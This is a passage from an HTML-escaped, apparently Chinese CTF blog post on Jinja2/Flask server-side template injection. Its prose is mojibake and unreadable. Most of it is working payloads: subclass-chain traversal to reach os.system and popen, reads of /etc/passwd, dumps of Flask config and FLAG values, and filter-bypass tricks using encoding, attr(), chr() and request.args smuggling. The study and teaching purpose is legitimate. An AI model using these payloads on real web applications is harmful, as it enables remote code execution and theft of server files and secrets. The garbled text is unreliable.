&lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;linecache&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__dict__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;os&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__dict__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;system&amp;#39;&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#d88200">&amp;#39;whoami&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="py3---__builtins__">py3 - __builtins__&lt;/h4>
&lt;p>py3ä¸­å°±æ²¡è¿™ä¹ˆç›´æŽ¥ï¼Œè¦å…³æ³¨çš„æ¨¡å—æ˜¯&lt;code>__builtins__&lt;/code>ï¼Œå€ŸåŠ©å®ƒæ¥è°ƒç”¨å†…ç½®çš„&lt;code>open()&lt;/code>è¿›è¡Œæ–‡ä»¶è¯»å†™ï¼Œç”¨&lt;code>eval()&lt;/code>å°†&lt;code>os&lt;/code>æ¨¡å—å¼•å…¥rce&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#39;eval&amp;#39;&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#d88200">&amp;#34;__import__(&amp;#39;os&amp;#39;).system(&amp;#39;whoami&amp;#39;)&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#39;open&amp;#39;&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#d88200">&amp;#39;/etc/passwd&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æˆ–è€…æ˜¯ç›´æŽ¥ç”¨&lt;code>__import__&lt;/code>åŠ è½½&lt;code>os&lt;/code>æ¨¡å—æ‰§è¡Œå‘½ä»¤&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#39;__import__&amp;#39;&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#d88200">&amp;#39;os&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">popen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;whoami&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>py2æœ‰ä¸ªç‰¹æ®Šçš„&lt;code>commands&lt;/code>æ¨¡å—ä¹Ÿå¯ä»¥ç›´æŽ¥rce&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#39;__import__&amp;#39;&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#d88200">&amp;#39;commands&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">getstatusoutput&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;whoami&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>â€”â€”â€”â€”â€”â€”æ³¨æ„å¼•ç”¨&lt;code>__builtins__&lt;/code>å†…å»ºæ¨¡å—è¿™ä¸€æ–¹å¼åœ¨py2&amp;amp;py3å®Œå…¨é€šæ€&lt;/p>
&lt;h2 id="å¸¸ç”¨payload">å¸¸ç”¨payload&lt;/h2>
&lt;p>å…¶å®žä¸Šé¢å·²ç»åˆ—ä¸¾çš„æ¯”è¾ƒå…¨å•¦ï¼Œè¿™é‡Œåšä¸€äº›å°å°çš„è¡¥å……&lt;/p>
&lt;h3 id="forè¯­å¥ç¡®å®šç´¢å¼•ä½ç½®">forè¯­å¥ç¡®å®šç´¢å¼•ä½ç½®&lt;/h3>
&lt;p>å‰é¢æåˆ°è¿‡ä¸€ç‚¹ï¼Œæˆ‘ä»¬éœ€è¦çš„å­ç±»åœ¨pythonä¸åŒç‰ˆæœ¬ä¸­ä½ç½®å¹¶ä¸å›ºå®šï¼ˆä¸»è¦æ˜¯py3 py2çš„åŸºæœ¬å›ºå®šæ­»äº†ï¼‰ï¼Œé’ˆå¯¹è¿™ä¸ªé—®é¢˜å¯ä»¥ç”¨Jinjaæ”¯æŒçš„forè¯­å¥æ¥è§£å†³ï¼Œsubmoduleçš„åå­—å¯ä»¥ç”¨ä¸Šé¢çš„è„šæœ¬è·‘&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">{% for c in ().__class__.__base__.__subclasses__() %}{% if c.__name__==&amp;#39;submodule&amp;#39; %}{{ c.__init__.__globals__[&amp;#39;__builtins__&amp;#39;].open(&amp;#39;filename&amp;#39;, &amp;#39;r&amp;#39;).read() }}{% endif %}{% endfor %}
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">{% for c in ().__class__.__base__.__subclasses__() %}{% if c.__name__==&amp;#39;submodule&amp;#39; %}{{c.__init__.__globals__[&amp;#39;__builtins__&amp;#39;].eval(&amp;#34;__import__(&amp;#39;os&amp;#39;).popen(&amp;#39;id&amp;#39;).read()&amp;#34;) }}{% endif %}{% endfor %}
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="ç‰¹æ®Šçš„ä¸€äº›å¯¹è±¡">ç‰¹æ®Šçš„ä¸€äº›å¯¹è±¡&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">{{config}}
{{config.items()}}
{{config.__class__.__init__.__globals__[&amp;#39;os&amp;#39;].popen(&amp;#39;ls&amp;#39;).read()}}
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">{{get_flashed_messages.__globals__[&amp;#39;current_app&amp;#39;].config}}
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">{{app.__init__.__globals__.sys.modules.app.app.__dict__}}
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">{{url_for.__globals__[&amp;#39;__builtins__&amp;#39;].__import__(&amp;#39;os&amp;#39;).system(&amp;#39;ls&amp;#39;)}}
{{url_for.__globals__[&amp;#39;current_app&amp;#39;].config.FLAG}}
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">{{request.__init__.__globals__[&amp;#39;__builtins__&amp;#39;].open(&amp;#39;/etc/passwd&amp;#39;).read()}}
{{request.application.__self__._get_data_for_json.__globals__[&amp;#39;json&amp;#39;].JSONEncoder.default.__globals__[&amp;#39;current_app&amp;#39;].config[&amp;#39;FLAG&amp;#39;]}}
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="å„ç§å„æ ·çš„bypass">å„ç§å„æ ·çš„bypass&lt;/h2>
&lt;p>ä¸€èˆ¬éƒ½ä¸ä¼šåªè¿‡æ»¤ä¸€ç§çš„ï¼Œç»¼åˆåº”ç”¨&lt;/p>
&lt;h3 id="é’ˆå¯¹å…³é”®å­—çš„è¿‡æ»¤">é’ˆå¯¹å…³é”®å­—çš„è¿‡æ»¤&lt;/h3>
&lt;p>ä»¥classä¸ºä¾‹ï¼Œåšä¸€ä¸ªå­—ç¬¦ä¸²çš„æ‹¼æŽ¥&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#d88200">&amp;#39;cl&amp;#39;&lt;/span>&lt;span style="color:#f92672">~&lt;/span>&lt;span style="color:#d88200">&amp;#39;ass&amp;#39;&lt;/span> &lt;span style="color:#75715e"># æ‹¼æŽ¥&lt;/span>
&lt;span style="color:#d88200">&amp;#34;cl&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#34;ass&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#d88200">&amp;#39;cla&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;ss&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e"># æ‹¼æŽ¥&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#d88200">&amp;#39;Y2xhc3M=&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;base64&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e"># b64&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\u0063\u006C\u0061\u0073\u0073&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span> &lt;span style="color:#75715e"># unicode&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\x63\x6c\x61\x73\x73&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span> &lt;span style="color:#75715e"># hex&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="è¿‡æ»¤">è¿‡æ»¤&lt;code>[]&lt;/code>&lt;/h3>
&lt;p>&lt;code>[]&lt;/code>ç”¨åœ¨å­—å…¸æŒ‰ç´¢å¼•å–å€¼å’Œæ•°ç»„ä¸­å–å€¼ï¼Œä¸è¿‡ç¦æ­¢äº†è¿˜æ˜¯æœ‰å‡½æ•°å¯ä»¥ç”¨&lt;/p>
&lt;ul>
&lt;li>
&lt;p>&lt;code>__getitem__&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__getitem__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__getitem__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__getitem__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;eval&amp;#39;&lt;/span>&lt;span style="color:#111">)(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__import__(&amp;#34;os&amp;#34;).popen(&amp;#34;ls /&amp;#34;).read()&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;code>pop()&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">pop&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">pop&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">pop&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;eval&amp;#39;&lt;/span>&lt;span style="color:#111">)(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__import__(&amp;#34;os&amp;#34;).popen(&amp;#34;ls /&amp;#34;).read()&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;code>.&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__bases__&lt;/span>&lt;span style="color:#ae81ff">.0&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__subclasses__&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">linecache&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">popen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;whoami&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="è¿‡æ»¤-1">è¿‡æ»¤&lt;code>.&lt;/code>&lt;/h3>
&lt;p>&lt;code>.&lt;/code>ç‚¹å·ç”¨åœ¨å‘ä¸‹ä¸åœåœ°å–å€¼ï¼Œè·Ÿ&lt;code>[]&lt;/code>å¾ˆåƒ&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;__class__&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;code>attr()&lt;/code> å¾ˆå¼ºçš„ä¸€ä¸ªflaskå†…ç½®filterï¼Œ&lt;code>foo|attr(&amp;quot;bar&amp;quot;) == foo.bar&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">{{()&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">attr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__class__&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">attr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__base__&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">............&lt;/span>&lt;span style="color:#111">}}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="è¿‡æ»¤-2">è¿‡æ»¤&lt;code>'&lt;/code>&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>&lt;code>chr&lt;/code> å…ˆæ‰¾å‡º&lt;code>chr()&lt;/code>çš„ä½ç½®ï¼ˆæ³¨æ„è·‘è„šæœ¬è·‘çš„æ˜¯&lt;code>__builtins__&lt;/code> è¿™ä¸ªå‡½æ•°æ˜¯å†…å»ºçš„ï¼‰ï¼Œç”¨æ¨¡æ¿è¯­å¥ç»™å®ƒèµ‹ä¸ªå€¼ï¼Œç„¶åŽè°ƒç”¨&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">{% set chr=().__class__.__bases__[0].__subclasses__()[index].__init__.__globals__.__builtins__.chr%}{{().__class__.__bases__.[0].__subclasses__().pop(40)(chr(47)+chr(101)+chr(116)+chr(99)+chr(47)+chr(112)+chr(97)+chr(115)+chr(115)+chr(119)+chr(100)).read()}}
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>&lt;code>request.args&lt;/code> flaskä¸­å­˜å‚¨è¯·æ±‚å‚æ•°åŠå€¼çš„å­—å…¸ï¼Œå¯ä»¥å°†å€¼å…ˆèµ‹ç»™å®ƒç„¶åŽè¿›è¡Œè°ƒç”¨&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">{{[].__class__.__base__.__subclasses__()[index].__init__.__globals__[request.args.arg1]}}&lt;span style="color:#960050;background-color:#1e0010">&amp;amp;&lt;/span>arg1=os
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="è¿‡æ»¤_">è¿‡æ»¤&lt;code>_&lt;/code>&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>&lt;code>request.args&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">{{&amp;#39;&amp;#39;[request.args.class][request.args.base][request.args.subclasses]()[index](&amp;#39;/etc/passwd&amp;#39;).read() }}&lt;span style="color:#960050;background-color:#1e0010">&amp;amp;&lt;/span>class=__class__&lt;span style="color:#960050;background-color:#1e0010">&amp;amp;&lt;/span>base=__base__&lt;span style="color:#960050;background-color:#1e0010">&amp;amp;&lt;/span>subclasses=__subclasses__
&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™ç§æ–¹å¼å¯ä»¥ç»“åˆgetå’Œpostï¼Œä¸¾ä¾‹-&amp;gt;&lt;a href="https://qgieod1s9b.feishu.cn/docs/doccnNEAk0zZJDhi7bypQhF6eFf#RYhszr">[CTFshow å‡»å‰‘æ¯]é€šå…³å¤§ä½¬&lt;/a>ï¼Œåœ¨ä¸åŒçš„å­—æ®µå¤„å¯¹ä¼ å…¥å‚æ•°çš„é™åˆ¶æ˜¯ä¸åŒçš„&lt;/p>
&lt;pre tabindex="0">&lt;code>/edit?a=__init__&amp;amp;b=__globals__&amp;amp;c=__getitem__&amp;amp;d=os&amp;amp;e=popen&amp;amp;f=whoami&amp;amp;g=read
POST: name={%25set%20r=request.args%25}&amp;amp;rank=1&amp;amp;speech={{(config|attr(r.a)|attr(r.b))|attr(r.c)(r.d)|attr(r.e)(r.f)|attr(r.g)()}}&amp;amp;time=2021å¹´11æœˆ11æ—¥
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>æŒ‰å­—ç¬¦ä¸²çš„æ–¹å¼èµ°ï¼Œä¹Ÿå¯&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="è¿‡æ»¤-3">è¿‡æ»¤&lt;code>{&lt;/code>&lt;/h3>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">{{}}&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">{&lt;/span>&lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="è¿‡æ»¤-">è¿‡æ»¤&lt;code> &lt;/code>&lt;/h3>
&lt;ul>
&lt;li>&lt;code>+&lt;/code>æ›¿ä»£&lt;/li>
&lt;/ul>
&lt;h2 id="å…¶å®ƒå§¿åŠ¿">å…¶å®ƒå§¿åŠ¿&lt;/h2>
&lt;h3 id="çŸ­çŸ­çŸ­">çŸ­çŸ­çŸ­&lt;/h3>
&lt;p>åˆ©ç”¨çš„æ˜¯Flaskä¸­çš„&lt;code>config&lt;/code>å¯¹è±¡ï¼Œå®ƒå¯ä»¥å­˜å‚¨ä¸€éƒ¨åˆ†è®¾ç½®é¡¹çš„å†…å®¹ï¼›&lt;code>config.update&lt;/code>æ–¹æ³•å¯ä»¥ç”¨æ¥å­˜å‚¨è®¾ç½®é¡¹ä¸­çš„å˜é‡ï¼Œç”¨æ³•æ˜¯&lt;code>config.update(key=value)&lt;/code>&lt;/p>
&lt;p>è¿™é‡Œç”¨ä¸€ä¸ªé¢˜åšä¾‹å­ï¼ŒæŒ‡è·¯-&amp;gt;&lt;a href="https://amiaaaz.github.io/2021/10/22/digitaloverdosectf2021-wp/#webmadlib">[Digital Overdose 2021 Autumn CTF madlib]&lt;/a>&lt;/p>
&lt;h3 id="pwn---åŠ«æŒgotè¡¨getshell">***pwn - åŠ«æŒgotè¡¨getshell&lt;/h3>
&lt;p>pwnï¼Œåœ¨å­¦äº†åœ¨å­¦äº†ï¼ŒæŒ‡æ–°å»ºæ–‡ä»¶å¤¹å’Œmdæ–‡æ¡£ðŸ˜…&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://ctf-wiki.org/pwn/sandbox/python/python-sandbox-escape/">Python æ²™ç®±é€ƒé€¸&lt;/a>&lt;/p>
&lt;h1 id="tornado">Tornado&lt;/h1>
